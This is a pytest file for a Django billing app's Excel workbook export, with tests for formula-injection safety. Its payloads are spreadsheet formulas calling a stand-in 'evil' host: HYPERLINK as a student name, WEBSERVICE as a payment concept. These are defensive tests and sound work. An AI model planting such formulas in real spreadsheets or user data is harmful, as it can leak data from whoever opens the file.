"""Tests for billing.exports — Excel workbook generation."""

from datetime import date
from decimal import Decimal

import pytest

from billing.exports import (
    build_database_workbook,
    build_enrollments_sheet,
    build_payments_sheet,
    build_students_sheet,
)
from billing.models import Payment
from core.utils import xlsx_safe_append

pytestmark = pytest.mark.django_db

HOSTILE_FORMULA = '=HYPERLINK("http://evil/","x")'


class TestBuildStudentsSheet:
    def test_header_row(self, db):
        import openpyxl

        wb = openpyxl.Workbook()
        ws = wb.active
        build_students_sheet(ws)
        headers = [cell.value for cell in ws[1]]
        assert "Nombre" in headers
        assert "Apellidos" in headers
        assert "Grupo" in headers
        assert "Tutor - DNI" in headers

    def test_includes_student_data(self, student_with_parent):
        import openpyxl

        wb = openpyxl.Workbook()
        ws = wb.active
        build_students_sheet(ws)
        # Row 1 = header, Row 2 = student
        assert ws.max_row == 2
        assert ws.cell(row=2, column=2).value == "Lucas"
        assert ws.cell(row=2, column=3).value == "López García"


class TestBuildEnrollmentsSheet:
    def test_includes_enrollment_data(self, active_enrollment):
        import openpyxl

        wb = openpyxl.Workbook()
        ws = wb.active
        build_enrollments_sheet(ws)
        assert ws.max_row == 2
        # Read the year off the fixture: it tracks the current course, so a
        # hard-coded literal here goes stale the day the calendar rolls over.
        assert ws.cell(row=2, column=5).value == active_enrollment.academic_year

    def test_empty_when_no_enrollments(self, db):
        import openpyxl

        wb = openpyxl.Workbook()
        ws = wb.active
        build_enrollments_sheet(ws)
        assert ws.max_row == 1  # Only header


class TestBuildPaymentsSheet:
    def test_includes_payment_data(self, pending_payment):
        import openpyxl

        wb = openpyxl.Workbook()
        ws = wb.active
        build_payments_sheet(ws)
        assert ws.max_row == 2
        assert ws.cell(row=2, column=8).value == "54.00"


class TestBuildDatabaseWorkbook:
    def test_three_sheets(self, student_with_parent, active_enrollment, pending_payment):
        wb = build_database_workbook()
        assert len(wb.sheetnames) == 3
        assert wb.sheetnames == ["Estudiantes", "Matrículas", "Pagos"]

    def test_empty_database(self, db):
        wb = build_database_workbook()
        assert len(wb.sheetnames) == 3
        # All sheets should have header only
        for ws in wb.worksheets:
            assert ws.max_row == 1


class TestXlsxFormulaInjection:
    """openpyxl marks a leading-`=` string as a FORMULA cell, so a name typed by
    a non-admin teacher becomes live code in the workbook an admin opens.

    `csv_safe`'s leading apostrophe cannot help here — in xlsx it is stored
    verbatim and just renames the student — so `xlsx_safe_append` forces the
    cell back to a string instead.
    """

    def test_the_guard_neutralises_a_formula_without_altering_the_text(self):
        import openpyxl

        ws = openpyxl.Workbook().active
        xlsx_safe_append(ws, [HOSTILE_FORMULA, "plain", 42])

        cells = list(ws[1])
        assert cells[0].data_type == "s", "a leading '=' must not stay a formula cell"
        assert cells[0].value == HOSTILE_FORMULA, "the text itself must survive intact"
        assert cells[2].value == 42, "non-strings are untouched"

    def test_the_database_workbook_contains_no_live_formulas(self, student, parent, active_enrollment):
        student.first_name = HOSTILE_FORMULA
        student.school = "=1+1"
        student.save(update_fields=["first_name", "school"])
        Payment.objects.create(
            student=student,
            parent=parent,
            enrollment=active_enrollment,
            payment_type="monthly",
            amount=Decimal("54.00"),
            payment_status="pending",
            due_date=date(2025, 10, 31),
            concept='=WEBSERVICE("http://evil/")',
        )

        formulas = [
            (ws.title, c.coordinate, c.value)
            for ws in build_database_workbook().worksheets
            for row in ws.iter_rows()
            for c in row
            if c.data_type == "f"
        ]
        assert formulas == [], f"export wrote live formulas: {formulas}"

    def test_the_suspicious_text_is_still_readable_in_the_export(self, student):
        student.first_name = HOSTILE_FORMULA
        student.save(update_fields=["first_name"])

        ws = build_database_workbook()["Estudiantes"]
        assert HOSTILE_FORMULA in [c.value for row in ws.iter_rows() for c in row]
